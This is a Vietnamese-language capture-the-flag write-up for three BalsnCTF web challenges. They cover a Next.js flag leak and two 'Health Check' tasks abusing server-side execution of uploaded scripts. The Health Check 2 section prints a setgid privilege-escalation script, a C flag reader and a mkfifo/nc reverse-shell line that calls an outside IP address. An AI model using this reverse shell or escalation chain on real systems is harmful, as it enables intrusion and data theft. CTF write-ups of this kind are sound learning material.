# Write-up-BalsnCTF (Web)
### 1. my first app
![image](https://user-images.githubusercontent.com/82523299/188363439-d3381264-6dc6-467b-aadf-5e1508b4b868.png)

- Bài này được viết bằng nextjs, tôi chưa bao giờ học code js cả nên gặp nextjs là ngáo luôn ^^. Và tôi dành ra 1 tiếng để học cấp tốc tại trang https://nextjs.org/learn
- Đây là source và flag nằm ở ![image](https://user-images.githubusercontent.com/82523299/188363832-5d2212d0-d59a-43e1-9a59-fa0974b3dfa5.png)


- Vì không quen với kiểu code web routes nên mãi một hồi tôi mới biết được cách endpoine cái api hello để xuất ra secret ![image](https://user-images.githubusercontent.com/82523299/188363885-cba16781-280a-4203-a25c-abc45f6c8fa1.png)
- Nhưng thứ tôi cần là flag :((
- Trong source index.js tác giả đã `import globalVars from '../utils/globalVars'` để xuất cái title ở index của trang web và biến `globalVars` cũng chứa flag
- ![image](https://user-images.githubusercontent.com/82523299/188364193-53be8df9-c690-4b56-8680-841609a54592.png)
- Và tôi tìm mọi cách để có thể injected vào đây ^^, và rồi phát hiện không có cách nào cả
- Tôi thử search các version của thư viện nhưng đều là last version, ko có lỗi cve => cùng đường :((
- Sau khi quay lại đọc document của nextjs tôi tìm được từ khóa `one page website` đây là kiểu code mà server gửi các file frontend cho client để hướng dẫn client xử lí giảm gánh nặng cho server. Thế là tôi lục code trong DevTools của trang web
- Vì file index đã import globalVars nên data cũng được gửi về client
- ![image](https://user-images.githubusercontent.com/82523299/188365202-1c148fcd-d038-4981-822f-e57cfda31007.png)
#### Flag: BALSN{hybrid_frontend_and_api}

### 2.Health Check 1
![image](https://user-images.githubusercontent.com/82523299/188365589-0033b0b4-77c5-4134-bca1-cdd3b82c0582.png)
- Access tới trang web và nhận được đoạn json như trên
- Sau một hồi fuzz thì web này đúng kiểu chẳng có gì cả :((
- Và rồi dùng dirsearch scan thì ra được đường dẫn `http://fastest-healthcheck.balsnctf.com/docs`
- Tiếp tục fuzz đường dẫn mới và trang mới này cho phép upload 1 file zip chứa 1 file script, sau mỗi 30s server sẽ tự động đi tới và thực thi file script đó, đây là những gì trang web nói, phải đi kiểm chứng thôi ^^
- ![image](https://user-images.githubusercontent.com/82523299/188367367-baad6a7b-be63-487d-8d94-b3e67f80d815.png)

- Lúc đầu tôi up 1 file script viết bằng python và compile thành file elf vì tôi nghĩ chỉ có elf mới thực thi được và nhận được kết quả
- ![image](https://user-images.githubusercontent.com/82523299/188365983-ac7b2b5a-7c8a-4685-885d-77bedc966d39.png)
- Và lại đi google, tôi biết đến bash script bắt đầu thực hiện thôi
- Vì output chỉ trả về trên file nên tôi đã curl để xác định xem script có thật sự được thực thi không
- ![image](https://user-images.githubusercontent.com/82523299/188366450-9f748c56-5a0f-4650-ba82-ea4ee7a26498.png)
- Nhận được request và biết rằng script có hoạt động
![image](https://user-images.githubusercontent.com/82523299/188366605-401882ff-6544-44f2-b9df-bcb7d89a7e47.png)
- Tiếp đến tôi viết luôn script để vét cạn luôn server ^^
- ![image](https://user-images.githubusercontent.com/82523299/188367209-ef691870-5ee2-4866-b6d8-0d8844c23cb6.png)
- ![image](https://user-images.githubusercontent.com/82523299/188368158-e3312c54-d08a-4c6a-a34e-a6ad21be8de1.png)
- Thấy được file flag nhưng nhìn kĩ thì không có quyền read, sau một hồi lục lọi thì trong folder __pycache__ chưa file pyc của file flag1.py 
#### Flag: BALSN{y37_4n0th3r_pYC4ch3_cHa1leN93???}

### 3.Health Check 2
- Tương tự bài Health Check 1 thì bây h tìm cách lây dc file flag2, nhưng đây không phải file python nên ko nằm trong pycache nữa
- Tới đây lại khó khăn, tôi bắt đầu nghĩ đến khái niệm leo thang đặc quyền mà tôi hay nghe thấy, bắt đầu search và học và thử khá nhiều cách và tạch cuối cùng cũng tìm ra cách để giải bài này
- Tôi tìm thầy file này trong source leak ra và nó xử lí file docker-entry 
![image](https://user-images.githubusercontent.com/82523299/188442154-b0e91ad7-80b2-496c-bcdb-36cb0867038c.png)
- Nếu bạn cung cấp `docker-entry` thay vì tệp `./run` thì chương trình sẽ chạy `docker-entry` bên trong `sandbox`
- Vậy bạn có thể tạo file với permission là `uploaded` bên trong file zip đã tải lên
-File docker-entry2
```
#!/usr/bin/bash
chmod 777 flag
chmod g+s flag
mv docker-entry docker-entry3
```
- File flag.c
```
int main(void) {
    execl("/usr/bin/cat", "cat", "../../flag2", 0);
}
```
- File run script dùng reverse shell để nc tới server
```
#!/usr/bin/bash
gcc -o flag flag.c
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f|sh -i 2>&1|nc 113.119.181.211 1000 >/tmp/f
```
- Nén 3 file trên vào zip rồi up lên sau đó nc ngồi đợi server
- Đổi tên file docker-entry2  thành docker-entry, để server thực thi docker-entry sau đó sẽ gán quyền egid=1000 cho file thực thi flag
- Trong linux `setuid` và `setgid` chạy chương trình với sự cho phép của user sở hữu chương trình đó. Cho nên script `flag` có thể cat `flag2`.
- Cuối cùng là ./flag và có flag.
- 
![image](https://user-images.githubusercontent.com/82523299/188469974-a4c53d99-5f8d-4ea7-8eb8-ef6a55677d72.png)
- 
![image](https://user-images.githubusercontent.com/82523299/188470169-d81c2569-cec4-4682-b305-bfecf665377f.png)

#### FLAG: BALSN{d0cK3r_baD_8ad_ro07_B4d_b@d}



